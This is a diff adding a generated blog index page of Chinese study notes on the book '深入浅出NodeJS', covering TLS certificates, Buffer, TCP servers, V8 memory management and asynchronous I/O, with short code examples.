+<li>通过Node的tls模块来创建一个安全的TCP服务，这个服务是一个简单的echo服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 创建私钥</span><br><span class="line">$ openssl genrsa -out client.key 1024</span><br><span class="line">// 生成CSR</span><br><span class="line">$ openssl req -new -key client.key -out client.csr</span><br><span class="line">// 生成签名证书</span><br><span class="line">$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in client.csr -out client.crt</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="HTTPS服务"><a href="#HTTPS服务" class="headerlink" title="HTTPS服务"></a>HTTPS服务</h4><ol>
+<li>HTTPS服务就是工作在TLS/SSL上的HTTP</li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/19/5-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">18</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/18/4-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/18/4-nodejs/" itemprop="url">「深入浅出NodeJS」 4. 理解Buffer</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-18T00:00:00+08:00">
+                2018-06-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="理解Buffer"><a href="#理解Buffer" class="headerlink" title="理解Buffer"></a>理解Buffer</h2><ol>
+<li>由于JavaScript自有的字符串无法处理网络传输中大量的二进制数据，于是Buffer对象应运而生。</li>
+</ol>
+<h3 id="Buffer结构"><a href="#Buffer结构" class="headerlink" title="Buffer结构"></a>Buffer结构</h3><ol>
+<li>Buffer是一个像Array的对象，但它主要用于操作字节。</li>
+</ol>
+<h4 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h4><ol>
+<li>Buffer性能相关部分用C++实现，非性能相关部分用JavaScript实现；Buffer所占用的是堆外内存，不属于V8分配；内置于global对象上，不需要require()即可使用</li>
+</ol>
+<h4 id="Buffer对象"><a href="#Buffer对象" class="headerlink" title="Buffer对象"></a>Buffer对象</h4><ol>
+<li><p>Buffer对象类似于数组，它的每个元素为16进制的两位数，0~255</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str = &quot;深入浅出node.js&quot;;</span><br><span class="line">var buf = new Buffer(str,&apos;utf-8&apos;);</span><br><span class="line">console.log(buf);</span><br><span class="line">// return &lt;Buffer e6 b7 b1 85 a5 ... 2e 6a 73&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>length和下标</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 初始化一个100字节的Buffer对象</span><br><span class="line">var buf = new Buffer(100);</span><br><span class="line">buf.length; // return 100</span><br><span class="line">buf[10] = 100</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="Buffer内存分配"><a href="#Buffer内存分配" class="headerlink" title="Buffer内存分配"></a>Buffer内存分配</h4><ol>
+<li><p>用以下方式分配指定内存大小的Buffer对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Buffer(size);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Buffer以8KB为界限来区分Buffer是大对象还是小对象</p>
+</li>
+</ol>
+<ul>
+<li>分配小buffer对象</li>
+<li>分配大Buffer对象</li>
+</ul>
+<h3 id="Buffer的转换"><a href="#Buffer的转换" class="headerlink" title="Buffer的转换"></a>Buffer的转换</h3><ol>
+<li>Buffer对象可以与字符串之间相互转换</li>
+</ol>
+<h4 id="字符串转Buffer"><a href="#字符串转Buffer" class="headerlink" title="字符串转Buffer"></a>字符串转Buffer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// encoding表示编码类型，没有则默认utf-8</span><br><span class="line">new Buffer(str,[encoding]);</span><br><span class="line">// write()方法可让一个Buffer对象存储不同编码类型的字符串转码的值</span><br><span class="line">buf.write(string,[offset],[length],[encoding]);</span><br></pre></td></tr></table></figure>
+<h4 id="Buffer转字符串"><a href="#Buffer转字符串" class="headerlink" title="Buffer转字符串"></a>Buffer转字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// toString()方法实现</span><br><span class="line">buf.toString([encoding],[start],[end]);</span><br></pre></td></tr></table></figure>
+<h4 id="Buffer不支持的编码类型"><a href="#Buffer不支持的编码类型" class="headerlink" title="Buffer不支持的编码类型"></a>Buffer不支持的编码类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// isEncoding()判断编码是否支持转换</span><br><span class="line">Buffer.isEncoding(encoding);</span><br></pre></td></tr></table></figure>
+<h3 id="Buffer的拼接"><a href="#Buffer的拼接" class="headerlink" title="Buffer的拼接"></a>Buffer的拼接</h3><h4 id="乱码是如何产生的"><a href="#乱码是如何产生的" class="headerlink" title="乱码是如何产生的"></a>乱码是如何产生的</h4><h4 id="setEncoding-与string-decoder"><a href="#setEncoding-与string-decoder" class="headerlink" title="setEncoding()与string_decoder()"></a>setEncoding()与string_decoder()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 让data事件中传递的不再是一个Buffer对象，而是编码后的字符串</span><br><span class="line">readable.setEncoding(&apos;utf-8&apos;);</span><br><span class="line">// 但这种方法能够处理的转码类型有限，仍不是最好的处理方法</span><br></pre></td></tr></table></figure>
+<h4 id="正确拼接Buffer"><a href="#正确拼接Buffer" class="headerlink" title="正确拼接Buffer"></a>正确拼接Buffer</h4><ol>
+<li>用Buffer.concat()方法生成一个合并的Buffer对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var chunks = [];</span><br><span class="line">var size = 0;</span><br><span class="line">res.on(&apos;data&apos;,function(chunk)&#123;</span><br><span class="line">    chunks.push(chunk);</span><br><span class="line">    size += chunk.length;</span><br><span class="line">&#125;);</span><br><span class="line">res.on(&apos;end&apos;,function()&#123;</span><br><span class="line">    var buf = Buffer.concat(chunks,size);</span><br><span class="line">    var str = iconv.decode(buf,&apos;utf-8&apos;);</span><br><span class="line">    console.log(str);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Buffer与性能"><a href="#Buffer与性能" class="headerlink" title="Buffer与性能"></a>Buffer与性能</h3><blockquote>
+<p>在应用中，我们通常会操作字符串，但一旦在网络中传输，都需要转换为Buffer，以进行二进制数据传输。</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>Buffer是二进制数据，字符串与Buffer之间存在编码关系。理解Buffer的诸多细节十分必要，对于如何高效处理二进制数据十分有用。</li>
+</ol>
+<blockquote>
+<p>Node提供了net、dgram、http、https这4个模块，分别用于处理TCP、UDP、HTTP、HTTPS，适用于服务器端和客户端</p>
+</blockquote>
+<h3 id="构建TCP服务"><a href="#构建TCP服务" class="headerlink" title="构建TCP服务"></a>构建TCP服务</h3><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><ol>
+<li>TCP全名为传输控制协议，在OSI模型中属于传输层协议。许多应用层协议基于TCP构建，如HTTP等。<h4 id="创建TCP服务器端"><a href="#创建TCP服务器端" class="headerlink" title="创建TCP服务器端"></a>创建TCP服务器端</h4></li>
+<li>创建一个TCP服务器端来接受网络请求<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var net = require(&apos;net&apos;);</span><br><span class="line">var server = net.createServer(function(socket)&#123;</span><br><span class="line">    // 新的连接</span><br><span class="line">    socket.on(&apos;data&apos;,function(data)&#123;</span><br><span class="line">        socket.write(&apos;你好&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    socket.on(&apos;end&apos;,function(data)&#123;</span><br><span class="line">        console.log(&apos;连接断开&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">    socket.write(&apos;欢迎&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">    server.listen(8124,function()&#123;</span><br><span class="line">        console.log(&apos;server bound&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/18/4-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">17</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/17/3-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/17/3-nodejs/" itemprop="url">「深入浅出NodeJS」 3. 内存控制</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-17T00:00:00+08:00">
+                2018-06-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="内存控制"><a href="#内存控制" class="headerlink" title="内存控制"></a>内存控制</h2><h3 id="V8的垃圾回收机制与内存限制"><a href="#V8的垃圾回收机制与内存限制" class="headerlink" title="V8的垃圾回收机制与内存限制"></a>V8的垃圾回收机制与内存限制</h3><h4 id="Node与V8"><a href="#Node与V8" class="headerlink" title="Node与V8"></a>Node与V8</h4><h4 id="V8的内存限制"><a href="#V8的内存限制" class="headerlink" title="V8的内存限制"></a>V8的内存限制</h4><ol>
+<li>Node中JavaScript使用的内存有限制（64位系统下约为1.7GB）</li>
+</ol>
+<h4 id="V8的对象分配"><a href="#V8的对象分配" class="headerlink" title="V8的对象分配"></a>V8的对象分配</h4><ol>
+<li>V8中，所有的JavaScript对象都是通过<strong>堆</strong>来进行分配的。</li>
+</ol>
+<h4 id="V8的垃圾回收机制"><a href="#V8的垃圾回收机制" class="headerlink" title="V8的垃圾回收机制"></a>V8的垃圾回收机制</h4><ol>
+<li>V8主要的垃圾回收算法</li>
+</ol>
+<ul>
+<li>V8的内存分代：V8中，主要将内存分为新生代和老生代，前者是存活时间较短的对象，后者是存活时间较长或常驻内存的对象</li>
+<li>Scavenge算法：新生代中的对象主要通过Scavenge算法进行垃圾回收。Scavenge的具体实现中采用了Cheney算法，通过将存活对象在两个semispace空间之间进行复制</li>
+<li>Mark-Sweep &amp; Mark-Compact：前者标记并清除死亡对象，后者清除死亡对象后会移动活着的对象，防止出现内存碎片</li>
+<li>Incremental Marking：垃圾回收与应用逻辑交替执行直到标记阶段完成</li>
+</ul>
+<h4 id="查看垃圾回收日志"><a href="#查看垃圾回收日志" class="headerlink" title="查看垃圾回收日志"></a>查看垃圾回收日志</h4><ol>
+<li><p>查看垃圾回收日志的方式主要是在启动时添加–trace_gc参数,执行结束后，会在gc.log文件中得到所有垃圾回收的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --trace_gc -e &quot;var a = [];for (var i = 0 ; i &lt; 100000; i++) a.push(new Array(100));&quot;&gt;gc.log</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>V8还提供了linux-tick-processor和windows-tick-processor.bat工具用于统计日志信息</p>
+</li>
+</ol>
+<h3 id="高效使用内存"><a href="#高效使用内存" class="headerlink" title="高效使用内存"></a>高效使用内存</h3><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><ol>
+<li>标识符查找</li>
+<li>作用域链</li>
+<li>变量的主动释放：可以通过delete操作来删除引用关系，或者将变量重新赋值，让旧的对象脱离引用关系，在接下来的老生代内存清除和整理的过程中，会被回收释放。</li>
+</ol>
+<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><ol>
+<li>JavaScript中，实现外部作用域访问内部作用域中变量的方法叫做<strong>闭包</strong>，这得益于高阶函数的特性：函数可以作为参数或者返回值</li>
+<li><p>返回值是一个匿名函数，这个函数中具备了访问local的条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var foo = function()&#123;</span><br><span class="line">    var bar = function()&#123;</span><br><span class="line">        var local = &quot;局部变量&quot;;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return local;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    var baz = bar();</span><br><span class="line">    console.log(baz());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在正常的JavaScript执行中，<strong>无法立即回收的内存</strong>有</p>
+</li>
+</ol>
+<ul>
+<li>闭包</li>
+<li>全局变量引用</li>
+</ul>
+<ol start="2">
+<li>由于V8内存限制，要小心此类变量是否无限制增加，因为它会导致老生代中的对象增多</li>
+</ol>
+<h3 id="内存指标"><a href="#内存指标" class="headerlink" title="内存指标"></a>内存指标</h3><h4 id="查看内存使用情况"><a href="#查看内存使用情况" class="headerlink" title="查看内存使用情况"></a>查看内存使用情况</h4><ol>
+<li>查看进程的内存占用</li>
+</ol>
+<ul>
+<li>调用process.memoryUsage(),rss是resident set size的缩写，即进程的常驻内存部分</li>
+</ul>
+<ol start="2">
+<li>查看系统的内存占用</li>
+</ol>
+<ul>
+<li>os模块中的totalmem()和freemem()用于查看操作系统的内存使用情况，分别返回系统总内存和闲置内存</li>
+</ul>
+<h4 id="堆外内存"><a href="#堆外内存" class="headerlink" title="堆外内存"></a>堆外内存</h4><ol>
+<li>将不是通过V8分配的内存称为<strong>堆外内存</strong></li>
+</ol>
+<h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><blockquote>
+<p>百度百科：内存泄漏（Memory Leak）是指程序中己动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。</p>
+</blockquote>
+<h4 id="慎将内存当作缓存"><a href="#慎将内存当作缓存" class="headerlink" title="慎将内存当作缓存"></a>慎将内存当作缓存</h4><ol>
+<li>缓存限制策略</li>
+<li>缓存的解决方案：采用进程外的缓存，将缓存转移到外部，减少常驻内存的对象的数量</li>
+</ol>
+<h4 id="关注队列状态"><a href="#关注队列状态" class="headerlink" title="关注队列状态"></a>关注队列状态</h4><h3 id="内存泄漏排查"><a href="#内存泄漏排查" class="headerlink" title="内存泄漏排查"></a>内存泄漏排查</h3><h4 id="nodeheapdump"><a href="#nodeheapdump" class="headerlink" title="nodeheapdump"></a>nodeheapdump</h4><h4 id="node-memwatch"><a href="#node-memwatch" class="headerlink" title="node-memwatch"></a>node-memwatch</h4><ol>
+<li>stats事件</li>
+<li>leak事件</li>
+<li>堆内存比较</li>
+</ol>
+<h3 id="大内存应用"><a href="#大内存应用" class="headerlink" title="大内存应用"></a>大内存应用</h3><ol>
+<li>Node提供了stram模块用于处理大文件，用fs.createReadStream()和fs.createWriteStream()方法通过流的方式实现对大文件的操作<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var reader = fs.createReadStream(&apos;in.txt&apos;);</span><br><span class="line">var writer = fs.createWriteStram(&apos;out.txt&apos;);</span><br><span class="line">reader.on(&apos;data&apos;,function(chunk)&#123;</span><br><span class="line">        writer.write(chunk);</span><br><span class="line">&#125;);</span><br><span class="line">reader.on(&apos;end&apos;,function()&#123;</span><br><span class="line">        writer.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 或者写成</span><br><span class="line">var reader = fs.createReadStream(&apos;in.txt&apos;);</span><br><span class="line">var writer = fs.createWriteStram(&apos;out.txt&apos;);</span><br><span class="line">reader.pipe(writer);</span><br><span class="line">//管道方法pipe()封装了data事件和写入操作，上述代码不会受到V8内存限制的影响</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/17/3-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">16</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/16/2-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/16/2-nodejs/" itemprop="url">「深入浅出NodeJS」 2. 为什么要异步I/O</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-16T00:00:00+08:00">
+                2018-06-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="为什么要异步I-O"><a href="#为什么要异步I-O" class="headerlink" title="为什么要异步I/O"></a>为什么要异步I/O</h1><h2 id="用户体验"><a href="#用户体验" class="headerlink" title="用户体验"></a>用户体验</h2><ol>
+<li>采用异步请求，在下载资源期间，JavaScript和UI的执行都不会处于等待状态，可以继续响应用户的交互行为，给用户一个鲜活的页面。</li>
+</ol>
+<ul>
+<li>同步实现：第二个资源的请求要等待第一个资源加载完成，总时间为M+N</li>
+<li>异步实现：第二个资源的请求并不依赖于第一个资源的结束，总时间为max（M,N）</li>
+</ul>
+<h2 id="资源分配"><a href="#资源分配" class="headerlink" title="资源分配"></a>资源分配</h2><blockquote>
+<p>单线程顺序执行任务的方式比较符合编程人员按顺序思考的思维方式，它依然是最主流的编程方式，因为它易于表达，但缺点在于性能。</p>
+<ol>
+<li>Node在两者之间给出了它的方案：利用<strong>单线程</strong>，远离多线程死锁、状态同步等问题；利用<strong>异步I/O</strong>，让单线程远离阻塞，以更好地使用CPU</li>
+</ol>
+</blockquote>
+<h2 id="异步I-O实现现状"><a href="#异步I-O实现现状" class="headerlink" title="异步I/O实现现状"></a>异步I/O实现现状</h2><h3 id="异步I-O与非阻塞I-O"><a href="#异步I-O与非阻塞I-O" class="headerlink" title="异步I/O与非阻塞I/O"></a>异步I/O与非阻塞I/O</h3><ol>
+<li>操作系统内核对于I/O只有两种方式：阻塞与非阻塞</li>
+</ol>
+<ul>
+<li>阻塞I/O完成整个获取数据的过程</li>
+<li>非阻塞I/O不带数据直接返回，要获取数据，还需要通过文件描述符再次读取<blockquote>
+<p>非阻塞的缺点是，立即返回的只是当前调用的状态（Not Data），应用程序需要重复调用I/O操作来确认是否完成。这种重复调用判断操作是否完成的技术叫<strong>轮询</strong>。</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="理想的非阻塞异步I-O"><a href="#理想的非阻塞异步I-O" class="headerlink" title="理想的非阻塞异步I/O"></a>理想的非阻塞异步I/O</h3><h3 id="现实的异步I-O"><a href="#现实的异步I-O" class="headerlink" title="现实的异步I/O"></a>现实的异步I/O</h3><h2 id="Node的异步I-O"><a href="#Node的异步I-O" class="headerlink" title="Node的异步I/O"></a>Node的异步I/O</h2><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><ol>
+<li>进程启动时，Node便会创建一个类似于while(true)的循环，<strong>每执行一次循环体的过程我们称为Tick</strong>。每个Tick过程查看是否有事件待处理，如果有，就取出<strong>事件及相关回调函数</strong>并执行。</li>
+</ol>
+<h3 id="观察者"><a href="#观察者" class="headerlink" title="观察者"></a>观察者</h3><ol>
+<li>向“观察者”询问。关联的回调函数就像是餐馆里客人点的菜单。</li>
+</ol>
+<h3 id="请求对象"><a href="#请求对象" class="headerlink" title="请求对象"></a>请求对象</h3><ol>
+<li>请求对象是异步I/O过程中的重要中间产物，所有的状态都保存在这个对象中，包括送入线程池等待执行以及I/O操作完毕后的回调处理。<blockquote>
+<p>补充：什么是回调函数？<br>你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。回答完毕。</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="执行回调"><a href="#执行回调" class="headerlink" title="执行回调"></a>执行回调</h3><ol>
+<li>组装好请求对象，送入I/O线程池中等待执行，实际上完成了异步I/O的第一部分，回调通知是第二部分。</li>
+</ol>
+<h2 id="非I-O的异步API"><a href="#非I-O的异步API" class="headerlink" title="非I/O的异步API"></a>非I/O的异步API</h2><h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><ol>
+<li>setTimeout()和setInterval与浏览器中API一致，分别用于单次和多次定时执行任务。</li>
+</ol>
+<h3 id="process-nextTick"><a href="#process-nextTick" class="headerlink" title="process.nextTick()"></a>process.nextTick()</h3><ol>
+<li>用process.nextTick()方法，将回调函数放入队列中，在下一轮Tick时取出执行，时间复杂度为O(1),比定时器方法实现立即异步的效果要好。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick = function(callback)&#123;</span><br><span class="line">    if (process._exciting) return;</span><br><span class="line">    if (tickDepth &gt;= process.maxTickDepth)</span><br><span class="line">        maxTickWarn();</span><br><span class="line">    var tock = &#123;callback : callback&#125;;</span><br><span class="line">    if (process.domain) tock.domain = process.domain;</span><br><span class="line">    nextTickQueue.push(tock);</span><br><span class="line">    if (nextTickQueue.length)&#123;</span><br><span class="line">        process._needTickCallback();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="setImmediate"><a href="#setImmediate" class="headerlink" title="setImmediate()"></a>setImmediate()</h4><ol>
+<li>setImmediate()与process.nextTick()都用于实现回调函数延迟执行，BUT，process.nextTick()属于idle观察者，setImmediate()属于check观察者，在每一个轮循环检查中，idle观察者先于I/O观察者，I/O观察者先于check观察者<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick(function()&#123;</span><br><span class="line">    console.log(&apos;nextTick延迟执行&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">setImmediate(function()&#123;</span><br><span class="line">    console.log(&apos;setImmediate延迟执行&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&apos;正常执行&apos;)</span><br><span class="line">// 返回结果如下</span><br><span class="line">正常执行</span><br><span class="line">nextTick延迟执行</span><br><span class="line">setImmediate延迟执行</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="事件驱动与高性能服务器"><a href="#事件驱动与高性能服务器" class="headerlink" title="事件驱动与高性能服务器"></a>事件驱动与高性能服务器</h2><ol>
+<li>Node通过事件驱动的方式处理请求，无须为每一个请求创建额外的对应线程，可以省掉创建线程和销毁线程的开销。</li>
+<li>同时上下文切换的代价很低，这是Node高性能的一个原因。</li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/16/2-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">15</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/15/1-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/15/1-nodejs/" itemprop="url">「深入浅出NodeJS」 1. 模块机制</a></h1>
+        
+
+        <div class="post-meta">
